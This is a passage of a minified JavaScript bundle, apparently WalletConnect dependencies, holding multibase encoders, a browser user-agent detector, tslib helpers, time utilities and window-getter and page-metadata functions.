C=0,A=b-1;(x!==0||C<I)&&A!==-1;A--,C++)x+=s*_[A]>>>0,_[A]=x%256>>>0,x=x/256>>>0;if(x!==0)throw new Error("Non-zero carry");I=C,v++}if(w[v]!==" "){for(var f=b-I;f!==b&&_[f]===0;)f++;for(var T=new Uint8Array(E+(b-f)),R=E;f!==b;)T[R++]=_[f++];return T}}}function g(w){var v=m(w);if(v)return v;throw new Error(`Non-${e} character`)}return{encode:p,decodeUnsafe:m,decode:g}}var Q8=X8,ex=Q8;const tx=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},nx=t=>new TextEncoder().encode(t),rx=t=>new TextDecoder().decode(t);class ix{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class ox{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return W1(this,e)}}class ax{constructor(e){this.decoders=e}or(e){return W1(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const W1=(t,e)=>new ax({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class sx{constructor(e,n,r,o){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=o,this.encoder=new ix(e,n,r),this.decoder=new ox(e,n,o)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const ol=({name:t,prefix:e,encode:n,decode:r})=>new sx(t,e,n,r),Qa=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:o}=ex(n,e);return ol({prefix:t,name:e,encode:r,decode:i=>tx(o(i))})},cx=(t,e,n,r)=>{const o={};for(let u=0;u<e.length;++u)o[e[u]]=u;let i=t.length;for(;t[i-1]==="=";)--i;const a=new Uint8Array(i*n/8|0);let s=0,c=0,l=0;for(let u=0;u<i;++u){const p=o[t[u]];if(p===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|p,s+=n,s>=8&&(s-=8,a[l++]=255&c>>s)}if(s>=n||255&c<<8-s)throw new SyntaxError("Unexpected end of data");return a},lx=(t,e,n)=>{const r=e[e.length-1]==="=",o=(1<<n)-1;let i="",a=0,s=0;for(let c=0;c<t.length;++c)for(s=s<<8|t[c],a+=8;a>n;)a-=n,i+=e[o&s>>a];if(a&&(i+=e[o&s<<n-a]),r)for(;i.length*n&7;)i+="=";return i},pt=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>ol({prefix:e,name:t,encode(o){return lx(o,r,n)},decode(o){return cx(o,r,n,t)}}),ux=ol({prefix:"\0",name:"identity",encode:t=>rx(t),decode:t=>nx(t)}),dx=Object.freeze(Object.defineProperty({__proto__:null,identity:ux},Symbol.toStringTag,{value:"Module"})),fx=pt({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),hx=Object.freeze(Object.defineProperty({__proto__:null,base2:fx},Symbol.toStringTag,{value:"Module"})),px=pt({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),mx=Object.freeze(Object.defineProperty({__proto__:null,base8:px},Symbol.toStringTag,{value:"Module"})),gx=Qa({prefix:"9",name:"base10",alphabet:"0123456789"}),wx=Object.freeze(Object.defineProperty({__proto__:null,base10:gx},Symbol.toStringTag,{value:"Module"})),bx=pt({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),yx=pt({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),vx=Object.freeze(Object.defineProperty({__proto__:null,base16:bx,base16upper:yx},Symbol.toStringTag,{value:"Module"})),xx=pt({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),_x=pt({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),Ex=pt({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),Cx=pt({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),Sx=pt({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),Ax=pt({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),Tx=pt({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),Ix=pt({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),$x=pt({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),Ox=Object.freeze(Object.defineProperty({__proto__:null,base32:xx,base32hex:Sx,base32hexpad:Tx,base32hexpadupper:Ix,base32hexupper:Ax,base32pad:Ex,base32padupper:Cx,base32upper:_x,base32z:$x},Symbol.toStringTag,{value:"Module"})),Px=Qa({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),Dx=Qa({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),Rx=Object.freeze(Object.defineProperty({__proto__:null,base36:Px,base36upper:Dx},Symbol.toStringTag,{value:"Module"})),Nx=Qa({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),kx=Qa({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),Mx=Object.freeze(Object.defineProperty({__proto__:null,base58btc:Nx,base58flickr:kx},Symbol.toStringTag,{value:"Module"})),Ux=pt({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),Bx=pt({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),Lx=pt({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),jx=pt({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),Fx=Object.freeze(Object.defineProperty({__proto__:null,base64:Ux,base64pad:Bx,base64url:Lx,base64urlpad:jx},Symbol.toStringTag,{value:"Module"})),z1=Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂"),Wx=z1.reduce((t,e,n)=>(t[n]=e,t),[]),zx=z1.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function Hx(t){return t.reduce((e,n)=>(e+=Wx[n],e),"")}function Vx(t){const e=[];for(const n of t){const r=zx[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const Zx=ol({prefix:"🚀",name:"base256emoji",encode:Hx,decode:Vx}),Gx=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:Zx},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const D0={...dx,...hx,...mx,...wx,...vx,...Ox,...Rx,...Mx,...Fx,...Gx};function H1(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const R0=H1("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),Ml=H1("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=F1(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),V1={utf8:R0,"utf-8":R0,hex:D0.base16,latin1:Ml,ascii:Ml,binary:Ml,...D0};function tn(t,e="utf8"){const n=V1[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?rf(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}function fn(t,e="utf8"){const n=V1[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}var N0=function(t,e,n){if(n||arguments.length===2)for(var r=0,o=e.length,i;r<o;r++)(i||!(r in e))&&(i||(i=Array.prototype.slice.call(e,0,r)),i[r]=e[r]);return t.concat(i||Array.prototype.slice.call(e))},qx=function(){function t(e,n,r){this.name=e,this.version=n,this.os=r,this.type="browser"}return t}(),Kx=function(){function t(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return t}(),Yx=function(){function t(e,n,r,o){this.name=e,this.version=n,this.os=r,this.bot=o,this.type="bot-device"}return t}(),Jx=function(){function t(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return t}(),Xx=function(){function t(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return t}(),Qx=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,e_=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,k0=3,t_=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",Qx]],M0=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function n_(t){return t?U0(t):typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new Xx:typeof navigator<"u"?U0(navigator.userAgent):o_()}function r_(t){return t!==""&&t_.reduce(function(e,n){var r=n[0],o=n[1];if(e)return e;var i=o.exec(t);return!!i&&[r,i]},!1)}function U0(t){var e=r_(t);if(!e)return null;var n=e[0],r=e[1];if(n==="searchbot")return new Jx;var o=r[1]&&r[1].split(".").join("_").split("_").slice(0,3);o?o.length<k0&&(o=N0(N0([],o,!0),a_(k0-o.length),!0)):o=[];var i=o.join("."),a=i_(t),s=e_.exec(t);return s&&s[1]?new Yx(n,i,a,s[1]):new qx(n,i,a)}function i_(t){for(var e=0,n=M0.length;e<n;e++){var r=M0[e],o=r[0],i=r[1],a=i.exec(t);if(a)return o}return null}function o_(){var t=typeof process<"u"&&process.version;return t?new Kx(process.version.slice(1)):null}function a_(t){for(var e=[],n=0;n<t;n++)e.push("0");return e}var Wr={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var ku=function(t,e){return ku=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(n,r){n.__proto__=r}||function(n,r){for(var o in r)r.hasOwnProperty(o)&&(n[o]=r[o])},ku(t,e)};function s_(t,e){ku(t,e);function n(){this.constructor=t}t.prototype=e===null?Object.create(e):(n.prototype=e.prototype,new n)}var Mu=function(){return Mu=Object.assign||function(e){for(var n,r=1,o=arguments.length;r<o;r++){n=arguments[r];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(e[i]=n[i])}return e},Mu.apply(this,arguments)};function c_(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var o=0,r=Object.getOwnPropertySymbols(t);o<r.length;o++)e.indexOf(r[o])<0&&Object.prototype.propertyIsEnumerable.call(t,r[o])&&(n[r[o]]=t[r[o]]);return n}function l_(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i}function u_(t,e){return function(n,r){e(n,r,t)}}function d_(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function f_(t,e,n,r){function o(i){return i instanceof n?i:new n(function(a){a(i)})}return new(n||(n=Promise))(function(i,a){function s(u){try{l(r.next(u))}catch(p){a(p)}}function c(u){try{l(r.throw(u))}catch(p){a(p)}}function l(u){u.done?i(u.value):o(u.value).then(s,c)}l((r=r.apply(t,e||[])).next())})}function h_(t,e){var n={label:0,sent:function(){if(i[0]&1)throw i[1];return i[1]},trys:[],ops:[]},r,o,i,a;return a={next:s(0),throw:s(1),return:s(2)},typeof Symbol=="function"&&(a[Symbol.iterator]=function(){return this}),a;function s(l){return function(u){return c([l,u])}}function c(l){if(r)throw new TypeError("Generator is already executing.");for(;n;)try{if(r=1,o&&(i=l[0]&2?o.return:l[0]?o.throw||((i=o.return)&&i.call(o),0):o.next)&&!(i=i.call(o,l[1])).done)return i;switch(o=0,i&&(l=[l[0]&2,i.value]),l[0]){case 0:case 1:i=l;break;case 4:return n.label++,{value:l[1],done:!1};case 5:n.label++,o=l[1],l=[0];continue;case 7:l=n.ops.pop(),n.trys.pop();continue;default:if(i=n.trys,!(i=i.length>0&&i[i.length-1])&&(l[0]===6||l[0]===2)){n=0;continue}if(l[0]===3&&(!i||l[1]>i[0]&&l[1]<i[3])){n.label=l[1];break}if(l[0]===6&&n.label<i[1]){n.label=i[1],i=l;break}if(i&&n.label<i[2]){n.label=i[2],n.ops.push(l);break}i[2]&&n.ops.pop(),n.trys.pop();continue}l=e.call(t,n)}catch(u){l=[6,u],o=0}finally{r=i=0}if(l[0]&5)throw l[1];return{value:l[0]?l[1]:void 0,done:!0}}}function p_(t,e,n,r){r===void 0&&(r=n),t[r]=e[n]}function m_(t,e){for(var n in t)n!=="default"&&!e.hasOwnProperty(n)&&(e[n]=t[n])}function Uu(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function Z1(t,e){var n=typeof Symbol=="function"&&t[Symbol.iterator];if(!n)return t;var r=n.call(t),o,i=[],a;try{for(;(e===void 0||e-- >0)&&!(o=r.next()).done;)i.push(o.value)}catch(s){a={error:s}}finally{try{o&&!o.done&&(n=r.return)&&n.call(r)}finally{if(a)throw a.error}}return i}function g_(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(Z1(arguments[e]));return t}function w_(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;for(var r=Array(t),o=0,e=0;e<n;e++)for(var i=arguments[e],a=0,s=i.length;a<s;a++,o++)r[o]=i[a];return r}function Pa(t){return this instanceof Pa?(this.v=t,this):new Pa(t)}function b_(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),o,i=[];return o={},a("next"),a("throw"),a("return"),o[Symbol.asyncIterator]=function(){return this},o;function a(m){r[m]&&(o[m]=function(g){return new Promise(function(w,v){i.push([m,g,w,v])>1||s(m,g)})})}function s(m,g){try{c(r[m](g))}catch(w){p(i[0][3],w)}}function c(m){m.value instanceof Pa?Promise.resolve(m.value.v).then(l,u):p(i[0][2],m)}function l(m){s("next",m)}function u(m){s("throw",m)}function p(m,g){m(g),i.shift(),i.length&&s(i[0][0],i[0][1])}}function y_(t){var e,n;return e={},r("next"),r("throw",function(o){throw o}),r("return"),e[Symbol.iterator]=function(){return this},e;function r(o,i){e[o]=t[o]?function(a){return(n=!n)?{value:Pa(t[o](a)),done:o==="return"}:i?i(a):a}:i}}function v_(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof Uu=="function"?Uu(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(i){n[i]=t[i]&&function(a){return new Promise(function(s,c){a=t[i](a),o(s,c,a.done,a.value)})}}function o(i,a,s,c){Promise.resolve(c).then(function(l){i({value:l,done:s})},a)}}function x_(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function __(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var n in t)Object.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}function E_(t){return t&&t.__esModule?t:{default:t}}function C_(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function S_(t,e,n){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,n),n}const A_=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return Mu},__asyncDelegator:y_,__asyncGenerator:b_,__asyncValues:v_,__await:Pa,__awaiter:f_,__classPrivateFieldGet:C_,__classPrivateFieldSet:S_,__createBinding:p_,__decorate:l_,__exportStar:m_,__extends:s_,__generator:h_,__importDefault:E_,__importStar:__,__makeTemplateObject:x_,__metadata:d_,__param:u_,__read:Z1,__rest:c_,__spread:g_,__spreadArrays:w_,__values:Uu},Symbol.toStringTag,{value:"Module"})),al=cp(A_);var Ul={},xo={},B0;function T_(){if(B0)return xo;B0=1,Object.defineProperty(xo,"__esModule",{value:!0}),xo.delay=void 0;function t(e){return new Promise(n=>{setTimeout(()=>{n(!0)},e)})}return xo.delay=t,xo}var kr={},Bl={},Mr={},L0;function I_(){return L0||(L0=1,Object.defineProperty(Mr,"__esModule",{value:!0}),Mr.ONE_THOUSAND=Mr.ONE_HUNDRED=void 0,Mr.ONE_HUNDRED=100,Mr.ONE_THOUSAND=1e3),Mr}var Ll={},j0;function $_(){return j0||(j0=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.ONE_YEAR=t.FOUR_WEEKS=t.THREE_WEEKS=t.TWO_WEEKS=t.ONE_WEEK=t.THIRTY_DAYS=t.SEVEN_DAYS=t.FIVE_DAYS=t.THREE_DAYS=t.ONE_DAY=t.TWENTY_FOUR_HOURS=t.TWELVE_HOURS=t.SIX_HOURS=t.THREE_HOURS=t.ONE_HOUR=t.SIXTY_MINUTES=t.THIRTY_MINUTES=t.TEN_MINUTES=t.FIVE_MINUTES=t.ONE_MINUTE=t.SIXTY_SECONDS=t.THIRTY_SECONDS=t.TEN_SECONDS=t.FIVE_SECONDS=t.ONE_SECOND=void 0,t.ONE_SECOND=1,t.FIVE_SECONDS=5,t.TEN_SECONDS=10,t.THIRTY_SECONDS=30,t.SIXTY_SECONDS=60,t.ONE_MINUTE=t.SIXTY_SECONDS,t.FIVE_MINUTES=t.ONE_MINUTE*5,t.TEN_MINUTES=t.ONE_MINUTE*10,t.THIRTY_MINUTES=t.ONE_MINUTE*30,t.SIXTY_MINUTES=t.ONE_MINUTE*60,t.ONE_HOUR=t.SIXTY_MINUTES,t.THREE_HOURS=t.ONE_HOUR*3,t.SIX_HOURS=t.ONE_HOUR*6,t.TWELVE_HOURS=t.ONE_HOUR*12,t.TWENTY_FOUR_HOURS=t.ONE_HOUR*24,t.ONE_DAY=t.TWENTY_FOUR_HOURS,t.THREE_DAYS=t.ONE_DAY*3,t.FIVE_DAYS=t.ONE_DAY*5,t.SEVEN_DAYS=t.ONE_DAY*7,t.THIRTY_DAYS=t.ONE_DAY*30,t.ONE_WEEK=t.SEVEN_DAYS,t.TWO_WEEKS=t.ONE_WEEK*2,t.THREE_WEEKS=t.ONE_WEEK*3,t.FOUR_WEEKS=t.ONE_WEEK*4,t.ONE_YEAR=t.ONE_DAY*365}(Ll)),Ll}var F0;function G1(){return F0||(F0=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=al;e.__exportStar(I_(),t),e.__exportStar($_(),t)}(Bl)),Bl}var W0;function O_(){if(W0)return kr;W0=1,Object.defineProperty(kr,"__esModule",{value:!0}),kr.fromMiliseconds=kr.toMiliseconds=void 0;const t=G1();function e(r){return r*t.ONE_THOUSAND}kr.toMiliseconds=e;function n(r){return Math.floor(r/t.ONE_THOUSAND)}return kr.fromMiliseconds=n,kr}var z0;function P_(){return z0||(z0=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=al;e.__exportStar(T_(),t),e.__exportStar(O_(),t)}(Ul)),Ul}var xi={},H0;function D_(){if(H0)return xi;H0=1,Object.defineProperty(xi,"__esModule",{value:!0}),xi.Watch=void 0;class t{constructor(){this.timestamps=new Map}start(n){if(this.timestamps.has(n))throw new Error(`Watch already started for label: ${n}`);this.timestamps.set(n,{started:Date.now()})}stop(n){const r=this.get(n);if(typeof r.elapsed<"u")throw new Error(`Watch already stopped for label: ${n}`);const o=Date.now()-r.started;this.timestamps.set(n,{started:r.started,elapsed:o})}get(n){const r=this.timestamps.get(n);if(typeof r>"u")throw new Error(`No timestamp found for label: ${n}`);return r}elapsed(n){const r=this.get(n);return r.elapsed||Date.now()-r.started}}return xi.Watch=t,xi.default=t,xi}var jl={},_o={},V0;function R_(){if(V0)return _o;V0=1,Object.defineProperty(_o,"__esModule",{value:!0}),_o.IWatch=void 0;class t{}return _o.IWatch=t,_o}var Z0;function N_(){return Z0||(Z0=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),al.__exportStar(R_(),t)}(jl)),jl}(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=al;e.__exportStar(P_(),t),e.__exportStar(D_(),t),e.__exportStar(N_(),t),e.__exportStar(G1(),t)})(Wr);var He={};Object.defineProperty(He,"__esModule",{value:!0});He.getLocalStorage=He.getLocalStorageOrThrow=He.getCrypto=He.getCryptoOrThrow=q1=He.getLocation=He.getLocationOrThrow=af=He.getNavigator=He.getNavigatorOrThrow=of=He.getDocument=He.getDocumentOrThrow=He.getFromWindowOrThrow=He.getFromWindow=void 0;function wi(t){let e;return typeof window<"u"&&typeof window[t]<"u"&&(e=window[t]),e}He.getFromWindow=wi;function ho(t){const e=wi(t);if(!e)throw new Error(`${t} is not defined in Window`);return e}He.getFromWindowOrThrow=ho;function k_(){return ho("document")}He.getDocumentOrThrow=k_;function M_(){return wi("document")}var of=He.getDocument=M_;function U_(){return ho("navigator")}He.getNavigatorOrThrow=U_;function B_(){return wi("navigator")}var af=He.getNavigator=B_;function L_(){return ho("location")}He.getLocationOrThrow=L_;function j_(){return wi("location")}var q1=He.getLocation=j_;function F_(){return ho("crypto")}He.getCryptoOrThrow=F_;function W_(){return wi("crypto")}He.getCrypto=W_;function z_(){return ho("localStorage")}He.getLocalStorageOrThrow=z_;function H_(){return wi("localStorage")}He.getLocalStorage=H_;var sf={};Object.defineProperty(sf,"__esModule",{value:!0});var K1=sf.getWindowMetadata=void 0;const G0=He;function V_(){let t,e;try{t=G0.getDocumentOrThrow(),e=G0.getLocationOrThrow()}catch{return null}function n(){const p=t.getElementsByTagName("link"),m=[];for(let g=0;g<p.length;g++){const w=p[g],v=w.getAttribute("rel");if(v&&v.toLowerCase().indexOf("icon")>-1){const E=w.getAttribute("href");if(E)if(E.toLowerCase().indexOf("https:")===-1&&E.toLowerCase().indexOf("http:")===-1&&E.indexOf("//")!==0){let I=e.protocol+"//"+e.host;if(E.indexOf("/")===0)I+=E;else{const b=e.pathname.split("/");b.pop();const _=b.join("/");I+=_+"/"+E}m.push(I)}else if(E.indexOf("//")===0){const I=e.protocol+E;m.push(I)}else m.push(E)}}return m}function r(...p){const m=t.getElementsByTagName("meta");for(let g=0;g<m.length;g++){const w=m[g],v=["itemprop","property","name"].map(E=>w.getAttribute(E)).filter(E=>E?p.includes(E):!1);if(v.length&&v){const E=w.getAttribute("content");if(E)return E}}return""}function o(){let p=r("name","og:site_name","og:title","twitter:title");return p||(p=t.title),p}function i(){return r("description","og:description","twitter:description","keywords")}const 